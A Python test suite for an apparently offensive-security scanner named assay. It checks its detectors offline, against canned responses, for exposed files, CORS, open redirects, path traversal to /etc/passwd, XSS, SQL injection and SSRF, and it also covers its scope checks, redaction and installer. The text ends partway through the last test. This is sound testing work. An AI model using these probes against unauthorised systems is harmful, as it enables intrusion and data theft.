"""Detection tests. Offline only - canned responses, no sockets, no live targets.

Each test asserts both directions: the check fires on the real condition, and
stays silent on the benign lookalike. The negative half is the one that keeps
the tool usable.
"""

from __future__ import annotations

import contextlib
import dataclasses
import json
import os
import sys
import unittest
from urllib.parse import parse_qs, urlsplit

sys.path.insert(0, __file__.rsplit("/tests/", 1)[0])

from tests.stub import (SOFT404_BODY, make_ctx, path_route, titles, web_target)

PASSWD = "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"


@contextlib.contextmanager
def _sink(into):
    """Capture assay.tools.PROGRESS as (message, tick) pairs for the block."""
    from assay import tools
    original = tools.PROGRESS
    tools.PROGRESS = lambda msg, tick=True: into.append((msg, tick))
    try:
        yield into
    finally:
        tools.PROGRESS = original


class ExposureTests(unittest.TestCase):
    def test_git_head_detected(self):
        from assay.modules.web_exposure import ExposureModule
        ctx, _ = make_ctx([
            path_route("/.git/HEAD", body="ref: refs/heads/main\n"),
            path_route("/.git/config", body="[core]\n\trepositoryformatversion = 0\n"),
        ])
        found = ExposureModule().run_web(ctx, web_target())
        self.assertIn("Exposed .git repository", titles(found))
        git = next(f for f in found if f.title == "Exposed .git repository")
        # The follow-up fetch of .git/config must promote it to confirmed.
        self.assertEqual(git.confidence, "confirmed")
        self.assertTrue(git.evidence, "a finding must carry evidence")
        self.assertTrue(git.impact, "a finding must state attacker impact")

    def test_soft404_shell_produces_nothing(self):
        """An SPA answering 200 HTML for every path must not yield findings."""
        from assay.modules.web_exposure import ExposureModule
        ctx, _ = make_ctx([])          # every path hits the 200 HTML catch-all
        found = ExposureModule().run_web(ctx, web_target())
        self.assertEqual(found, [], "soft-404 shell produced false positives: %s"
                         % titles(found))

    def test_env_html_error_page_not_reported(self):
        """A themed 'not found' HTML page containing the word DB_PASSWORD."""
        from assay.modules.web_exposure import ExposureModule
        body = ("<html><title>404 Not Found</title><body>No such file: "
                "DB_PASSWORD=example</body></html>")
        ctx, _ = make_ctx([path_route("/.env", ctype="text/html", body=body)])
        found = ExposureModule().run_web(ctx, web_target())
        self.assertNotIn("Exposed .env file", titles(found))

    def test_env_detected_as_plaintext(self):
        from assay.modules.web_exposure import ExposureModule
        ctx, _ = make_ctx([path_route(
            "/.env", body="APP_KEY=base64:x\nDB_PASSWORD=hunter2\n")])
        found = ExposureModule().run_web(ctx, web_target())
        self.assertIn("Exposed .env file", titles(found))
        self.assertEqual(found[0].severity, "critical")


class DirListingTests(unittest.TestCase):
    def test_index_of_detected(self):
        from assay.modules.web_exposure import DirListingModule
        listing = ("<html><head><title>Index of /backup</title></head><body>"
                   "<h1>Index of /backup</h1><a href='../'>Parent Directory</a>"
                   "<a href='db.sql'>db.sql</a></body></html>")
        ctx, _ = make_ctx([path_route("/backup/", ctype="text/html", body=listing)])
        found = DirListingModule().run_web(ctx, web_target())
        self.assertEqual(len(found), 1)
        # /backup is on the sensitive list, so it must outrank a plain /assets hit.
        self.assertEqual(found[0].severity, "medium")

    def test_no_listing_no_finding(self):
        from assay.modules.web_exposure import DirListingModule
        ctx, _ = make_ctx([])
        self.assertEqual(DirListingModule().run_web(ctx, web_target()), [])


class CorsTests(unittest.TestCase):
    @staticmethod
    def _reflecting(creds: bool):
        def route(m, url, h, b):
            origin = h.get("Origin")
            hdrs = {"Content-Type": "application/json"}
            if origin:
                hdrs["Access-Control-Allow-Origin"] = origin
                if creds:
                    hdrs["Access-Control-Allow-Credentials"] = "true"
            return 200, hdrs, '{"email":"a@b.c","token":"x"}'
        return route

    def test_reflected_origin_with_credentials(self):
        from assay.modules.web_headers import CorsModule
        ctx, _ = make_ctx([self._reflecting(True)])
        found = CorsModule().run_web(ctx, web_target())
        t = titles(found)
        self.assertIn("CORS reflects arbitrary Origin with credentials allowed", t)
        f = found[0]
        self.assertEqual(f.confidence, "confirmed")
        self.assertEqual(f.severity, "high")
        # Two distinct sentinel origins must both have been reflected.
        self.assertGreaterEqual(len(f.evidence), 2)

    def test_static_acao_is_not_reflection(self):
        """A fixed ACAO for a partner origin must not be called reflection."""
        from assay.modules.web_headers import CorsModule

        def route(m, url, h, b):
            return 200, {"Content-Type": "application/json",
                         "Access-Control-Allow-Origin": "https://partner.example.org",
                         "Access-Control-Allow-Credentials": "true"}, "{}"
        ctx, _ = make_ctx([route])
        found = CorsModule().run_web(ctx, web_target())
        self.assertEqual(found, [], "static ACAO misreported: %s" % titles(found))

    def test_wildcard_without_sensitive_data_is_quiet(self):
        from assay.modules.web_headers import CorsModule

        def route(m, url, h, b):
            return 200, {"Content-Type": "application/json",
                         "Access-Control-Allow-Origin": "*"}, '{"status":"ok"}'
        ctx, _ = make_ctx([route])
        self.assertEqual(CorsModule().run_web(ctx, web_target()), [])


class OpenRedirectTests(unittest.TestCase):
    @staticmethod
    def _redirector(param="next"):
        def route(m, url, h, b):
            parts = urlsplit(url)
            if parts.path != "/login":
                return None
            q = parse_qs(parts.query)
            if param not in q:
                return None
            return 302, {"Location": q[param][0]}, ""
        return route

    def test_open_redirect_from_crawled_url(self):
        from assay.modules.web_active import OpenRedirectModule
        origin = "http://target.test:8080"
        ctx, _ = make_ctx([self._redirector()],
                          urls={origin: [origin + "/login?next=/dashboard"]})
        found = OpenRedirectModule().run_web(ctx, web_target())
        self.assertTrue(found, "open redirect on a crawled URL was missed")
        self.assertEqual(found[0].confidence, "confirmed")
        self.assertIn("next", found[0].title)

    def test_relative_redirect_is_not_open(self):
        """Redirecting to a fixed internal path must never be reported."""
        from assay.modules.web_active import OpenRedirectModule

        def route(m, url, h, b):
            if urlsplit(url).path != "/login":
                return None
            return 302, {"Location": "/dashboard"}, ""
        origin = "http://target.test:8080"
        ctx, _ = make_ctx([route], urls={origin: [origin + "/login?next=/dashboard"]})
        self.assertEqual(OpenRedirectModule().run_web(ctx, web_target()), [])


class TraversalTests(unittest.TestCase):
    def test_passwd_oracle(self):
        from assay.modules.web_active import TraversalModule

        def route(m, url, h, b):
            parts = urlsplit(url)
            if parts.path != "/download":
                return None
            q = parse_qs(parts.query)
            if "etc/passwd" in (q.get("file", [""])[0]):
                return 200, {"Content-Type": "text/plain"}, PASSWD
            return None
        origin = "http://target.test:8080"
        ctx, _ = make_ctx([route], urls={origin: [origin + "/download?file=report.pdf"]})
        found = TraversalModule().run_web(ctx, web_target())
        self.assertTrue(found, "path traversal with a /etc/passwd oracle was missed")
        self.assertEqual(found[0].severity, "critical")
        self.assertEqual(found[0].confidence, "confirmed")

    def test_reflected_payload_without_file_contents(self):
        """Echoing the payload back is not a file read."""
        from assay.modules.web_active import TraversalModule

        def route(m, url, h, b):
            q = parse_qs(urlsplit(url).query)
            return 200, {"Content-Type": "text/html"}, \
                "<p>No such file: %s</p>" % q.get("file", [""])[0]
        origin = "http://target.test:8080"
        ctx, _ = make_ctx([route], urls={origin: [origin + "/download?file=x"]})
        self.assertEqual(TraversalModule().run_web(ctx, web_target()), [])


class HostHeaderTests(unittest.TestCase):
    def test_xfh_reflection(self):
        from assay.modules.web_active import HostHeaderModule

        def route(m, url, h, b):
            xfh = h.get("X-Forwarded-Host")
            if not xfh:
                return None
            return 200, {"Content-Type": "text/html",
                         "Cache-Control": "public, max-age=60"}, \
                "<a href='https://%s/reset'>reset</a>" % xfh
        ctx, _ = make_ctx([route])
        found = HostHeaderModule().run_web(ctx, web_target())
        self.assertTrue(found)
        self.assertEqual(found[0].confidence, "confirmed")
        self.assertIn("cache", found[0].tags)

    def test_no_reflection_no_finding(self):
        from assay.modules.web_active import HostHeaderModule
        ctx, _ = make_ctx([])
        self.assertEqual(HostHeaderModule().run_web(ctx, web_target()), [])


class GraphQLTests(unittest.TestCase):
    def test_introspection(self):
        from assay.modules.web_active import GraphQLModule
        schema = ('{"data":{"__schema":{"queryType":{"name":"Query"},'
                  '"mutationType":{"name":"Mutation"},"types":[{"name":"User"}]}}}')
        ctx, _ = make_ctx([path_route("/graphql", ctype="application/json",
                                      body=schema, method="POST")])
        found = GraphQLModule().run_web(ctx, web_target())
        self.assertTrue(found)
        # A mutation root means state-changing operations are enumerable.
        self.assertEqual(found[0].severity, "medium")

    def test_introspection_disabled(self):
        from assay.modules.web_active import GraphQLModule
        ctx, _ = make_ctx([path_route(
            "/graphql", ctype="application/json", method="POST",
            body='{"errors":[{"message":"introspection is disabled"}]}')])
        self.assertEqual(GraphQLModule().run_web(ctx, web_target()), [])


class SecretsTests(unittest.TestCase):
    def test_aws_key_and_sourcemap(self):
        from assay.modules.secrets import SecretsModule
        js = ('var API="https://billing.internal:8443/api";\n'
              'var k="AKIAIOSFODNN7EXAMPLE";\n'
              '//# sourceMappingURL=app.js.map\n')
        smap = '{"version":3,"sources":["src/admin/Secret.tsx"],"sourcesContent":["x"]}'
        ctx, _ = make_ctx([
            path_route("/", ctype="text/html",
                       body='<html><script src="/static/app.js"></script></html>'),
            path_route("/static/app.js", ctype="application/javascript", body=js),
            path_route("/static/app.js.map", ctype="application/json", body=smap),
        ])
        found = SecretsModule().run_web(ctx, web_target())
        t = titles(found)
        self.assertIn("AWS access key id exposed in client-side asset", t)
        self.assertIn("JavaScript source map published in production", t)
        self.assertIn("Internal hosts referenced from client-side JavaScript", t)

    def test_clean_bundle_is_quiet(self):
        from assay.modules.secrets import SecretsModule
        ctx, _ = make_ctx([
            path_route("/", ctype="text/html",
                       body='<html><script src="/static/app.js"></script></html>'),
            path_route("/static/app.js", ctype="application/javascript",
                       body='function f(){return 1}'),
        ])
        self.assertEqual(SecretsModule().run_web(ctx, web_target()), [])


class ScoringTests(unittest.TestCase):
    def test_confirmed_critical_outranks_tentative_critical(self):
        from assay.models import Evidence, Finding
        confirmed = Finding(title="a", target="t", severity="critical",
                            confidence="confirmed", impact="x",
                            evidence=[Evidence(kind="http")])
        tentative = Finding(title="b", target="t", severity="critical",
                            confidence="tentative", impact="x",
                            evidence=[Evidence(kind="http")])
        self.assertGreater(confirmed.compute_score(), tentative.compute_score())
        self.assertEqual(confirmed.triage, "CHASE")

    def test_evidence_free_finding_is_damped(self):
        from assay.models import Evidence, Finding
        with_ev = Finding(title="a", target="t", severity="high", confidence="firm",
                          impact="x", evidence=[Evidence(kind="http")])
        without = Finding(title="a", target="t", severity="high", confidence="firm",
                          impact="x")
        self.assertGreater(with_ev.compute_score(), without.compute_score() * 2)

    def test_hygiene_finding_never_reaches_chase(self):
        from assay.models import Evidence, Finding
        f = Finding(title="Security headers absent", target="t", severity="info",
                    confidence="firm", impact="x", tags=["noise-prone"],
                    evidence=[Evidence(kind="http")])
        f.compute_score()
        self.assertEqual(f.triage, "NOTE")


class ScopeTests(unittest.TestCase):
    def test_wildcard_cidr_and_deny(self):
        from assay.config import Scope
        s = Scope(allow=["*.target.tld", "10.0.0.0/8"], deny=["nope.target.tld"])
        self.assertTrue(s.allows("api.target.tld"))
        self.assertTrue(s.allows("10.1.2.3"))
        self.assertFalse(s.allows("nope.target.tld"))
        self.assertFalse(s.allows("evil.tld"))
        self.assertFalse(s.allows("target.tld.evil.tld"))

    def test_out_of_scope_request_is_blocked(self):
        from assay.config import Config, Scope
        from assay.net import HttpClient
        cfg = Config(scope=Scope(allow=["target.tld"]))
        r = HttpClient(cfg).get("https://evil.tld/")
        self.assertEqual(r.error, "out-of-scope")
        self.assertEqual(r.status, 0)


class RedactionTests(unittest.TestCase):
    SAMPLE = (
        "https://admin.acmebank.com:8443/x (10.42.7.13)\n"
        "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.sig\n"
        "DB_PASSWORD=Sup3rS3cret\naws_access_key_id=AKIAIOSFODNN7EXAMPLE\n"
        "jane.doe@acmebank.com  415-555-0199\n"
        "root:x:0:0:root:/root:/bin/bash\n/home/jsmith/app\n"
        "https://owasp.org/ref\n"
    )

    def _redactor(self):
        from assay.redact import Redactor, terms_from_context
        return Redactor(extra_terms=terms_from_context(
            ["https://admin.acmebank.com"], ["*.acmebank.com"], ["10.42.7.13"]))

    def test_no_residual_leaks(self):
        r = self._redactor()
        self.assertEqual(r.verify(r.text(self.SAMPLE)), [])

    def test_reference_domains_survive(self):
        r = self._redactor()
        self.assertIn("owasp.org", r.text(self.SAMPLE))

    def test_pseudonyms_are_stable_and_reversible(self):
        r = self._redactor()
        out = r.text(self.SAMPLE)
        self.assertEqual(out, r.text(self.SAMPLE))
        self.assertIn("acmebank.com", r.map.rehydrate(out))
        self.assertNotIn("acmebank", out)

    def test_payload_gate_blocks_on_leak(self):
        """A term the redactor does not know must be caught by verify()."""
        from assay.redact import Redactor
        r = Redactor(extra_terms=[])
        leaked = "contact ops at internal-jump.corpnet.example-client.tld"
        self.assertTrue(r.verify(leaked), "verify() failed to flag a bare hostname")

    def test_ai_payload_refuses_to_build_with_leaks(self):
        from assay.ai import AIConfig, build_payload
        from assay.models import Evidence, Finding
        from assay.redact import Redactor
        f = [Finding(title="x", target="https://a.acmebank.com/", severity="high",
                     impact="y", evidence=[Evidence(kind="http", output="10.9.9.9")])]
        payload, leaks = build_payload(f, {}, AIConfig(include_evidence=True), Redactor())
        blob = str(payload)
        self.assertNotIn("acmebank.com", blob)
        self.assertNotIn("10.9.9.9", blob)
        self.assertEqual(leaks, [])


class NucleiFilterTests(unittest.TestCase):
    def test_fingerprint_templates_dropped(self):
        from assay.modules.web_nuclei import NucleiModule
        m = NucleiModule()
        for tid in ("tech-detect", "waf-detect", "http-missing-security-headers"):
            self.assertIsNone(m._convert({"template-id": tid,
                                          "info": {"severity": "info"}}), tid)

    def test_real_finding_converted(self):
        from assay.modules.web_nuclei import NucleiModule
        f = NucleiModule()._convert({
            "template-id": "git-config-exposure",
            "matched-at": "https://t/.git/config",
            "response": "[core]",
            "info": {"name": "Git Config", "severity": "high",
                     "tags": ["exposure", "config"],
                     "classification": {"cwe-id": ["cwe-200"]}}})
        self.assertIsNotNone(f)
        self.assertEqual(f.severity, "high")
        self.assertTrue(f.evidence[0].response)




class InstallerTests(unittest.TestCase):
    """The planner is exercised against a simulated Kali box.

    The real target environment (apt + go present) cannot be reproduced on the
    development machine, so _has() and the tool inventory are stubbed to prove
    the plan is correct for the environment assay actually ships to.
    """

    def _plan(self, have_apt=True, have_go=True, present=(), constrained=False,
              only=None):
        from assay import installer
        from assay.env import Resources

        binaries = {"apt-get": have_apt, "go": have_go}
        orig_has, orig_avail, orig_res, orig_gopath = (
            installer._has, installer.tools.available,
            installer.env.resources, installer.gopath_bin)
        installer._has = lambda b: binaries.get(b, b in present)
        installer.tools.available = lambda: {
            n: ("/usr/bin/" + n if n in present else None)
            for n in installer.tools.REGISTRY}
        # constrained is (cpus <= 2 or mem_avail < 2048), so both must move.
        installer.env.resources = lambda: Resources(
            cpus=2 if constrained else 8,
            mem_total_mb=2048 if constrained else 16384,
            mem_avail_mb=900 if constrained else 8000)
        installer.gopath_bin = lambda: "/root/go/bin"
        try:
            return installer.build_plan(only=only)
        finally:
            (installer._has, installer.tools.available,
             installer.env.resources, installer.gopath_bin) = (
                orig_has, orig_avail, orig_res, orig_gopath)

    def test_kali_plan_covers_apt_and_go(self):
        plan = self._plan()
        cmds = [s.display() for s in plan.steps]
        self.assertTrue(any("apt-get update" in c for c in cmds))
        install = next(c for c in cmds if "apt-get install" in c)
        for pkg in ("nmap", "ffuf", "seclists", "arjun"):
            self.assertIn(pkg, install)
        self.assertTrue(any("nuclei" in c and "go install" in c for c in cmds))
        self.assertEqual(plan.unsupported, [])
        self.assertEqual(plan.path_hint, "/root/go/bin")

    def test_already_installed_tools_are_skipped(self):
        plan = self._plan(present=("nmap", "nuclei", "ffuf"))
        self.assertNotIn("nmap", plan.missing)
        self.assertIn("nmap", plan.already)
        cmds = " ".join(s.display() for s in plan.steps)
        self.assertNotIn("nuclei@latest", cmds)
        self.assertNotIn("nuclei -update-templates", cmds)

    def test_nothing_to_do_yields_empty_plan(self):
        plan = self._plan(present=tuple(
            __import__("assay.tools", fromlist=["REGISTRY"]).REGISTRY))
        self.assertTrue(plan.empty)

    def test_post_install_only_for_queued_tools(self):
        """nuclei's template update must not run when go is unavailable."""
        plan = self._plan(have_apt=False, have_go=False)
        cmds = " ".join(s.display() for s in plan.steps)
        self.assertNotIn("update-templates", cmds)
        self.assertTrue(plan.empty)

    def test_nuclei_templates_queued_when_installable(self):
        plan = self._plan(only=["nuclei"])
        cmds = [s.display() for s in plan.steps]
        self.assertTrue(any("update-templates" in c for c in cmds))

    def test_constrained_vm_pins_single_compiler_process(self):
        plan = self._plan(constrained=True, only=["httpx"])
        build = next(s for s in plan.steps if "build" in s.label)
        self.assertEqual(build.env_extra.get("GOFLAGS"), "-p=1")
        self.assertTrue(any("single" in n for n in plan.notes))

    def test_unconstrained_host_does_not_pin_goflags(self):
        plan = self._plan(constrained=False, only=["httpx"])
        build = next(s for s in plan.steps if "build" in s.label)
        self.assertEqual(build.env_extra, {})

    def test_go_toolchain_installed_first_when_absent(self):
        plan = self._plan(have_go=False, only=["httpx"])
        labels = [s.label for s in plan.steps]
        self.assertIn("install the Go toolchain", labels)
        self.assertLess(labels.index("install the Go toolchain"),
                        labels.index("build httpx"))

    def test_root_needs_no_sudo(self):
        from assay import installer
        orig = installer._sudo_needed
        installer._sudo_needed = lambda: False
        try:
            plan = self._plan(only=["nmap"])
            self.assertFalse(any(s.needs_sudo for s in plan.steps))
        finally:
            installer._sudo_needed = orig

    def test_registry_holds_only_tools_that_get_used(self):
        """Installing a tool nobody calls wastes build time on a small VM."""
        from assay import tools
        self.assertNotIn("gowitness", tools.REGISTRY)
        self.assertNotIn("puredns", tools.REGISTRY)

    def test_non_debian_is_reported_not_attempted(self):
        plan = self._plan(have_apt=False, have_go=True, only=["nmap"])
        self.assertIn("nmap", plan.unsupported)
        self.assertEqual(plan.steps, [])
        self.assertTrue(any("non-Debian" in n for n in plan.notes))


class ReflectionTests(unittest.TestCase):
    ORIGIN = "http://target.test:8080"

    def _ctx(self, transform):
        """transform(reflected_value) -> what the page renders."""
        def route(m, url, h, b):
            q = parse_qs(urlsplit(url).query)
            val = q.get("q", [""])[0]
            return 200, {"Content-Type": "text/html"}, transform(val)
        return make_ctx([route], urls={self.ORIGIN: [self.ORIGIN + "/s?q=x"]})

    def test_raw_html_reflection_is_high(self):
        from assay.modules.web_reflect import ReflectionModule
        ctx, _ = self._ctx(lambda v: "<html><body><p>%s</p></body></html>" % v)
        found = ReflectionModule().run_web(ctx, web_target())
        self.assertTrue(found)
        self.assertEqual(found[0].severity, "high")
        self.assertIn("HTML body text", found[0].detail)

    def test_fully_encoded_reflection_is_not_reported(self):
        from assay.modules.web_reflect import ReflectionModule
        import html as _h
        ctx, _ = self._ctx(lambda v: "<p>%s</p>" % _h.escape(v, quote=True)
                           .replace("`", "&#96;").replace("(", "&#40;")
                           .replace(")", "&#41;").replace("{", "&#123;")
                           .replace("}", "&#125;").replace(";", "&#59;"))
        self.assertEqual(ReflectionModule().run_web(ctx, web_target()), [])

    def test_no_reflection_no_finding(self):
        from assay.modules.web_reflect import ReflectionModule
        ctx, _ = self._ctx(lambda v: "<p>static page</p>")
        self.assertEqual(ReflectionModule().run_web(ctx, web_target()), [])

    def test_json_response_is_not_a_browser_sink(self):
        """Reflection into an application/json body is not XSS."""
        from assay.modules.web_reflect import ReflectionModule

        def route(m, url, h, b):
            q = parse_qs(urlsplit(url).query)
            return 200, {"Content-Type": "application/json"}, \
                '{"q":"%s"}' % q.get("q", [""])[0]
        ctx, _ = make_ctx([route], urls={self.ORIGIN: [self.ORIGIN + "/s?q=x"]})
        self.assertEqual(ReflectionModule().run_web(ctx, web_target()), [])

    def test_script_context_with_quotes_is_high(self):
        from assay.modules.web_reflect import ReflectionModule
        ctx, _ = self._ctx(
            lambda v: "<html><script>var a=\"%s\";</script></html>"
            % v.replace("<", "&lt;").replace(">", "&gt;"))
        found = ReflectionModule().run_web(ctx, web_target())
        self.assertTrue(found)
        self.assertEqual(found[0].severity, "high")
        self.assertIn("script", found[0].detail.lower())


class SqliTests(unittest.TestCase):
    ORIGIN = "http://target.test:8080"
    MYSQL_ERR = ("You have an error in your SQL syntax; check the manual that "
                 "corresponds to your MySQL server version")

    def test_error_differential_fires(self):
        from assay.modules.web_sqli import SqliModule

        def route(m, url, h, b):
            v = parse_qs(urlsplit(url).query).get("id", [""])[0]
            broken = v.count("'") % 2 == 1
            body = self.MYSQL_ERR if broken else "<p>Product 1</p>"
            return 200, {"Content-Type": "text/html"}, body
        ctx, _ = make_ctx([route], urls={self.ORIGIN: [self.ORIGIN + "/p?id=1"]})
        found = SqliModule().run_web(ctx, web_target())
        self.assertTrue(found, "error differential missed")
        self.assertEqual(found[0].severity, "critical")
        self.assertEqual(len(found[0].evidence), 2)

    def test_page_that_always_errors_is_not_reported(self):
        """A permanently broken page is not an injection point."""
        from assay.modules.web_sqli import SqliModule

        def route(m, url, h, b):
            return 200, {"Content-Type": "text/html"}, self.MYSQL_ERR
        ctx, _ = make_ctx([route], urls={self.ORIGIN: [self.ORIGIN + "/p?id=1"]})
        self.assertEqual(SqliModule().run_web(ctx, web_target()), [])

    def test_error_text_without_differential_is_not_reported(self):
        """Error appears for both broken and balanced quotes -> not injection."""
        from assay.modules.web_sqli import SqliModule

        def route(m, url, h, b):
            v = parse_qs(urlsplit(url).query).get("id", [""])[0]
            body = self.MYSQL_ERR if "'" in v else "<p>ok</p>"
            return 200, {"Content-Type": "text/html"}, body
        ctx, _ = make_ctx([route], urls={self.ORIGIN: [self.ORIGIN + "/p?id=1"]})
        self.assertEqual(SqliModule().run_web(ctx, web_target()), [])

    def test_boolean_inference_requires_stable_baseline(self):
        """An endpoint whose output changes every request must be skipped."""
        from assay.modules.web_sqli import SqliModule
        counter = {"n": 0}

        def route(m, url, h, b):
            counter["n"] += 1
            return 200, {"Content-Type": "text/html"}, \
                "<p>random %d %s</p>" % (counter["n"], "x" * counter["n"])
        ctx, _ = make_ctx([route], urls={self.ORIGIN: [self.ORIGIN + "/p?id=1"]})
        self.assertEqual(SqliModule().run_web(ctx, web_target()), [])


class SsrfTests(unittest.TestCase):
    ORIGIN = "http://target.test:8080"

    def test_inband_fetch_error_is_tentative(self):
        from assay.modules.web_ssrf import SsrfModule
        from assay.oob import OOBSession
        import tempfile

        def route(m, url, h, b):
            if "url=" in url:
                return 200, {"Content-Type": "text/html"}, \
                    "cURL error 6: Could not resolve host"
            return None
        ctx, _ = make_ctx([route], urls={self.ORIGIN: [self.ORIGIN + "/f?url=x"]})
        ctx.oob = OOBSession(tempfile.mkdtemp(), domain="c.oastify.com")
        ctx.oob.start()
        found = SsrfModule().run_web(ctx, web_target())
        self.assertTrue(found)
        self.assertEqual(found[0].confidence, "tentative")
        self.assertEqual(found[0].category[:3], "A10")

    def test_no_oob_session_means_no_probe(self):
        from assay.modules.web_ssrf import SsrfModule
        ctx, http = make_ctx([], urls={self.ORIGIN: [self.ORIGIN + "/f?url=x"]})
        ctx.oob = None
        self.assertEqual(SsrfModule().run_web(ctx, web_target()), [])

    def test_ledger_records_every_payload_fired(self):
        from assay.oob import OOBSession
        import tempfile, os
        s = OOBSession(tempfile.mkdtemp(), domain="c.oastify.com")
        s.start()
        pid, host = s.payload("https://t/x param=url")
        self.assertIn(pid, host)
        path = s.flush_ledger()
        self.assertTrue(os.path.exists(path))
        self.assertIn(pid, open(path).read())


class HostDeepTests(unittest.TestCase):
    def test_rules_fire_only_on_the_true_condition(self):
        from assay.modules.host_deep import load_rules
        rules = {r["script"]: r for r in load_rules()}
        cases = [
            ("ftp-anon", "Anonymous FTP login allowed (FTP code 230)", True),
            ("ftp-anon", "530 login incorrect", False),
            ("smb2-security-mode", "Message signing enabled but not required", True),
            ("smb2-security-mode", "Message signing enabled and required", False),
            ("smb-enum-shares", "Anonymous access: READ/WRITE", True),
            ("smb-enum-shares", "Anonymous access: <none>", False),
            ("rdp-enum-encryption", "CredSSP (NLA): FAILED", True),
            ("rdp-enum-encryption", "CredSSP (NLA): SUCCESS", False),
            ("smtp-open-relay", "Server is an open relay (16/16 tests)", True),
            ("smtp-open-relay", "Server doesn't seem to be an open relay", False),
            ("mysql-empty-password", "root account has empty password", True),
            ("mysql-empty-password", "All accounts require a password", False),
        ]
        for script, output, expected in cases:
            fired = bool(rules[script]["_re"].search(output))
            self.assertEqual(fired, expected, "%s on %r" % (script, output))

    def test_finding_carries_evidence_and_a_next_step(self):
        from assay.modules.host_deep import HostDeepModule, load_rules
        rule = next(r for r in load_rules() if r["script"] == "ftp-anon")
        f = HostDeepModule()._finding(rule, "10.0.0.9", 21,
                                      "Anonymous FTP login allowed", "Anonymous FTP")
        self.assertEqual(f.confidence, "confirmed")
        self.assertTrue(f.evidence and f.evidence[0].output)
        self.assertIn("10.0.0.9", f.repro)
        self.assertTrue(f.impact)


class SurfaceTests(unittest.TestCase):
    def test_vhost_requires_divergence_from_both_baselines(self):
        """A catch-all server that answers everything identically yields nothing."""
        from assay import recon
        ctx, http = make_ctx([])       # every request returns the same shell
        hits = recon.vhost_probe(http, "http://target.test:8080/",
                                 ["dev.target.test", "api.target.test"])
        self.assertEqual(hits, [])

    def test_vhost_detected_when_response_differs(self):
        from assay import recon

        def route(m, url, h, b):
            if h.get("Host", "").startswith("dev."):
                return 200, {"Content-Type": "text/html"}, \
                    "<html><h1>Staging control panel</h1>" + ("filler " * 60) + "</html>"
            return None
        ctx, http = make_ctx([route])
        hits = recon.vhost_probe(http, "http://target.test:8080/",
                                 ["dev.target.test", "api.target.test"])
        self.assertEqual([n for n, _ in hits], ["dev.target.test"])

    def test_origin_requires_a_cdn_in_front(self):
        """No CDN means there is nothing to bypass."""
        from assay import recon
        ctx, http = make_ctx([])
        self.assertIsNone(recon.origin_exposed(http, "target.test", "1.2.3.4"))

    def test_cdn_detection(self):
        from assay.recon import detect_cdn
        from assay.net import Resp
        r = Resp(url="x", status=200, headers={"CF-Ray": "abc"}, body="", elapsed=0)
        self.assertEqual(detect_cdn(r), "cloudflare")
        self.assertEqual(detect_cdn(Resp(url="x", status=200,
                                         headers={"Server": "nginx"},
                                         body="", elapsed=0)), "")


class UrlSourcingTests(unittest.TestCase):
    def test_js_extraction_separates_local_from_foreign(self):
        from assay.urls import extract_from_js
        js = ('fetch("/api/v2/me");var C="https://cdn.other.tld/x.js";'
              'var A="https://target.test/v1/orders";var m="application/json";'
              'var i="/logo.png";')
        local, foreign = extract_from_js(js, "https://target.test/a.js", "target.test")
        self.assertIn("https://target.test/api/v2/me", local)
        self.assertIn("https://target.test/v1/orders", local)
        self.assertEqual(foreign, ["https://cdn.other.tld/x.js"])
        joined = " ".join(local)
        self.assertNotIn("application/json", joined)
        self.assertNotIn("logo.png", joined)

    def test_dedupe_collapses_id_variants(self):
        from assay.urls import dedupe_by_shape
        urls = ["https://t/x?id=%d" % i for i in range(50)] + ["https://t/y?a=1&b=2"]
        self.assertEqual(len(dedupe_by_shape(urls, 100)), 2)

    def test_assets_are_not_injection_points(self):
        from assay.urls import dedupe_by_shape
        self.assertEqual(dedupe_by_shape(
            ["https://t/a.png", "https://t/b.css", "https://t/c.woff2"], 10), [])

    def test_hidden_params_are_appended(self):
        from assay.urls import with_params
        got = with_params("https://t/x?id=1", ["debug", "id", "admin"])
        self.assertIn("debug=1", got)
        self.assertIn("admin=1", got)
        self.assertEqual(got.count("id="), 1, "existing param must not duplicate")


class BasicAuthTests(unittest.TestCase):
    def test_header_is_set_and_shared_with_tools(self):
        from assay.config import Config
        from assay import tools
        cfg = Config(basic_auth="admin:s3cret")
        self.assertEqual(cfg.request_headers()["Authorization"],
                         "Basic YWRtaW46czNjcmV0")
        self.assertEqual(tools.header_args("nuclei",
                                           {"Authorization": cfg.auth_header()}),
                         ["-H", "Authorization: Basic YWRtaW46czNjcmV0"])

    def test_absent_by_default(self):
        from assay.config import Config
        self.assertIsNone(Config().auth_header())
        self.assertNotIn("Authorization", Config().request_headers())


class WindowsWslBridgeTests(unittest.TestCase):
    """assay hosted on Windows, external scanners executed inside WSL."""

    def setUp(self):
        from assay import env
        self._name = env.os.name
        self._state = dict(env._WSL_STATE)
        self._paths = dict(env._PATH_CACHE)

    def tearDown(self):
        from assay import env
        env.os.name = self._name
        env._WSL_STATE.clear(); env._WSL_STATE.update(self._state)
        env._PATH_CACHE.clear(); env._PATH_CACHE.update(self._paths)

    def _windows(self, gateway=None):
        from assay import env
        env.os.name = "nt"
        env._WSL_STATE.update(checked=True, ok=True, distro="kali-linux",
                              **({"gateway": gateway} if gateway else {}))
        env._PATH_CACHE.clear()
        return env

    def test_native_host_is_untouched(self):
        from assay import tools
        self.assertEqual(tools.bridge(["nmap", "-sV"]), ["nmap", "-sV"])

    def test_commands_are_wrapped_for_wsl(self):
        self._windows()
        from assay import tools
        self.assertEqual(tools.bridge(["nuclei", "-silent"]),
                         ["wsl.exe", "-d", "kali-linux", "--", "nuclei", "-silent"])

    def test_windows_paths_translate_to_wsl_mounts(self):
        env = self._windows()
        self.assertEqual(env.to_wsl_path(r"C:\Users\me\out\raw\nmap.xml"),
                         "/mnt/c/Users/me/out/raw/nmap.xml")

    def test_sudo_check_does_not_crash_without_geteuid(self):
        """os.geteuid does not exist on Windows."""
        from assay import installer
        real = getattr(installer.os, "geteuid", None)
        try:
            if real is not None:
                del installer.os.geteuid
            self.assertTrue(installer._sudo_needed())
        finally:
            if real is not None:
                installer.os.geteuid = real

    def test_no_subprocess_uses_a_shell(self):
        """shell=True plus attacker-influenced argv is how tools get owned.

        Parsed rather than grepped: the string also appears in prose explaining
        why it is avoided, and a test that cannot tell code from a comment is
        not a test.
        """
        import ast
        import pathlib
        root = pathlib.Path(__file__).resolve().parent.parent / "assay"
        offenders = []
        for f in sorted(root.rglob("*.py")):
